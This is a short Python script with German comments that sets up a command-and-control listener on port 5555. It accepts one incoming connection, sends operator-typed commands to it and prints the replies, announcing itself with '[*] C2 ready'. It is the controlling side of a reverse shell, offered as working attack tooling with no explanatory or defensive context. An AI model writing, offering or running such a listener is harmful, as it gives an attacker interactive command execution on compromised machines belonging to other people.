import socket
import threading

def handle(client, addr):
    print(f"[+] Verbunden: {addr}")
    while True:
        try:
            cmd = input("Kommando> ")
            if cmd.lower() in ("exit", "quit"):
                client.close()
                break
            client.send((cmd + "\n").encode())
            resp = client.recv(4096)
            print(resp.decode(), end="")
        except:
            break

if __name__ == "__main__":
    s = socket.socket()
    s.bind(("0.0.0.0", 5555))
    s.listen(1)
    print("[*] C2 ready")

    conn, addr = s.accept()
    threading.Thread(
        target=handle,
        args=(conn, addr),
        daemon=True
    ).start()

    # Haupt-Thread am Leben erhalten
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nBeendet.")
